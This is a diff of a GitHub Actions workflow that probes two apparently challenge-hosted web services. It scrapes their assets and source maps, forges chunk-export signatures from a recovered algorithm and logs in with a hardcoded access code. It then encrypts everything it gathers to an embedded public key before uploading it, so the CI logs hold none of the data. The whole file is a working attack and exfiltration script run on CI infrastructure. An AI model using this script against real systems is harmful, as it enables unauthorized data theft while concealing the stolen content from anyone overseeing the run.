@@ -1,4 +1,4 @@
-name: cyberkomi-parma-blackbox-gov-templates
+name: cyberkomi-static-chain-recovery
 
 on:
   push:
@@ -11,9 +11,9 @@ permissions:
 jobs:
   probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 7
+    timeout-minutes: 10
     steps:
-      - name: Export intended PARMA chunks and inspect GOV template catalogue
+      - name: Recover PARMA blackbox and GOV public client logic
         shell: bash
         run: |
           set -euo pipefail
@@ -23,6 +23,32 @@ jobs:
           G='https://task-gov-relay-a90ea5f1999a03b4.caplag-task.ru'
           ARCH='BBX-P23-00'; SEED='PARMA-NIGHT-23'
 
+          curl -sS --connect-timeout 8 --max-time 30 -D out/parma/root.headers -o out/parma/root.html "$P/" || true
+          curl -sS --connect-timeout 8 --max-time 30 -D out/gov/root.headers -o out/gov/root.html "$G/" || true
+
+          # Fetch every same-origin static asset directly referenced by either HTML shell.
+          python3 - <<'PY'
+          import re, pathlib, urllib.parse, subprocess
+          for name,base in [('parma','https://task-parma-line-ce3d96e598f7b9c1.caplag-task.ru/'),('gov','https://task-gov-relay-a90ea5f1999a03b4.caplag-task.ru/')]:
+              p=pathlib.Path(f'out/{name}/root.html')
+              if not p.exists(): continue
+              text=p.read_text('utf-8',errors='replace')
+              urls=[]
+              for raw in re.findall(r'''(?:src|href)=["']([^"']+)["']''',text,re.I):
+                  u=urllib.parse.urljoin(base,raw)
+                  q=urllib.parse.urlsplit(u)
+                  if q.netloc==urllib.parse.urlsplit(base).netloc and u not in urls: urls.append(u)
+              for i,u in enumerate(urls,1):
+                  subprocess.run(['curl','-sS','--connect-timeout','6','--max-time','30','-D',f'out/{name}/asset_{i}.headers','-o',f'out/{name}/asset_{i}.body',u],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+                  pathlib.Path(f'out/{name}/asset_{i}.url').write_text(u)
+                  if u.endswith('.js'):
+                      subprocess.run(['curl','-sS','--connect-timeout','6','--max-time','30','-o',f'out/{name}/asset_{i}.map',u+'.map'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+          PY
+
+          # Known PARMA source map exposed by the client.
+          curl -sS --connect-timeout 8 --max-time 30 -o out/parma/dispatch-map.js.map "$P/static/dispatch-map.js.map" || true
+
+          # Export the six manifest chunks using the source-map-recovered signature algorithm.
           for cid in c04 c01 d09 c03 x17 c02; do
             sig=$(printf '%s' "$ARCH:$cid:$SEED" | sha256sum | cut -c1-16 | tr '[:lower:]' '[:upper:]')
             printf '{"archiveId":"%s","chunkId":"%s"}' "$ARCH" "$cid" > handoff/chunk.json
@@ -35,37 +61,48 @@ jobs:
               "$P/api/archive/chunk" || true
           done
 
-          # The observer role advertises viewing public templates. Probe only natural catalogue routes.
-          for path in api/templates api/templates/public api/public/templates api/template api/broadcast/templates api/messages/templates; do
+          # GOV observer entry and advertised public/template surfaces.
+          curl -sS --connect-timeout 8 --max-time 30 -c handoff/gov.cookies -b handoff/gov.cookies \
+            -H 'Content-Type: application/json' --data '{"code":"BUS-05-STEFAN"}' \
+            -D out/gov/access.headers -o out/gov/access.json "$G/api/access" || true
+          for path in api/templates api/templates/public api/public/templates api/template api/broadcast/templates api/messages/templates static/gov-relay-client.js static/gov-relay-client.js.map; do
             safe=$(echo "$path" | tr '/' '_')
-            curl -sS --connect-timeout 5 --max-time 20 -D "out/gov/${safe}.headers" -o "out/gov/${safe}.body" "$G/$path" || true
+            curl -sS --connect-timeout 6 --max-time 25 -c handoff/gov.cookies -b handoff/gov.cookies \
+              -D "out/gov/${safe}.headers" -o "out/gov/${safe}.body" "$G/$path" || true
           done
+
+          # Useful string inventory only; no response content goes to stdout.
+          find out -type f -printf '%P\t%s bytes\n' | sort > out/manifest.tsv
 
           cat > handoff/output_public.pem <<'PEM'
           -----BEGIN PUBLIC KEY-----
-          MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAqvptF4aTPzGzR6fNOtz3
-          p/Ds9uFcANf/SCwSCWZEqbNmMGqmMYOexJISES2kjQJqiPoovpFrr4bawgr9zw7y
-          sSxNcsP9lbuOdMKEU+tVS+2TebLPXMv4Ue8yX5ZhWdK3c9uz3RZHW8oWLTWgUBlC
-          N7NDHSJDqeFJm4NFxBUYfVwYzxU2uD6m8r1B3FZrz/YGmMsMQFV5gWqTdiAmtosu
-          uSxUJ1891V9Qd4URX4TGbkGGAE+aSSNF1WTykdECOSZmrspbu5C48489D94iaDyU
-          4y+NlouCIV6/DGoJvd6VSp3SwZTTNShPQ2YKhnvRN75g7Sm++9RYeipo7xmrOBIZ
-          bbyjuSC9Nd6Vy99R40e38UMAFzDUXKq5GjCBNMdA3VxrMSvs+LFeKQ77rB6h7EkX
-          xVHeZPvwwV6lYUQ1i7DnLRLlz4mVqVGVa2hifx9VY2PM/M2c5/iA0uHEWQkxZ9F1
-          YSb2e96Ws1+dS0tHu4hzArM8lZQEaHveFLsIu67isD0/AgMBAAE=
+          MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA2Ba9epHeeeFkxQns16PF
+          rc5gW8anxXMzXwCdtn2ZW8ZyaxgWJVpzdE/dYXHI2q4OvzYwRNB2UMK6xeaLuyY0
+          4xTNkx1T7JqTDrEGZ1kllooXi2hjaE3fumVksGzk5ppq1AJwTwlTld+Q1eXbeHF/
+          lAZrjQLkNuB6ITcs2WCtLucZiRlu31qUNXOE0BN63mhVxY6U4Y0uhJEUk90UbT5t
+          wO4268+320awlHz/ZjQX+zizd4NqeeLeh2atSxqkO2myTfdGbUmc38GI7kaBxZoe
+          x49Jz8nI+B0ntI8AxU80RNOyqs7s2iCNpNX5Of1sAUvvma3jvyNYww+Jk7rW+rL6
+          T6GZrnm3GSZsXKCjwSAvff+TZFdsfHArwTEu7IacMta57kL5Aj+oZ1FC3Lc6Mjgm
+          b0OeujRPULdlyzXtPOM+Sfzvuei7BJyklSu6D70grMlfyXxasNtN8EahtmJTVC2N
+          uAbDkxQmrcoiSn5RFdVRfYDcNryuzMKeQgbD4nWZpsp3AgMBAAE=
           -----END PUBLIC KEY-----
           PEM
           tar -C out -czf handoff/results.tar.gz .
-          openssl rand 32 > handoff/key; openssl rand 16 > handoff/iv
+          openssl rand 32 > handoff/key
+          openssl rand 16 > handoff/iv
           openssl enc -aes-256-ctr -K "$(xxd -p -c256 handoff/key)" -iv "$(xxd -p -c256 handoff/iv)" -in handoff/results.tar.gz -out handoff/results.enc
           cat handoff/key handoff/iv > handoff/keyblob
-          openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob -out handoff/keyblob.enc -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
-          rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem handoff/chunk.json
-          echo 'Blackbox export and template catalogue probe complete; responses encrypted.'
+          openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob -out handoff/keyblob.enc \
+            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
+          rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem handoff/chunk.json handoff/gov.cookies
+          echo 'Static chain recovery completed; all response data encrypted.'
+
       - name: Upload encrypted result
         uses: actions/upload-artifact@v4
         with:
-          name: cyberkomi-blackbox-templates-encrypted
+          name: cyberkomi-static-chain-encrypted
           path: |
             handoff/results.enc
             handoff/keyblob.enc
           retention-days: 1
+          if-no-files-found: error
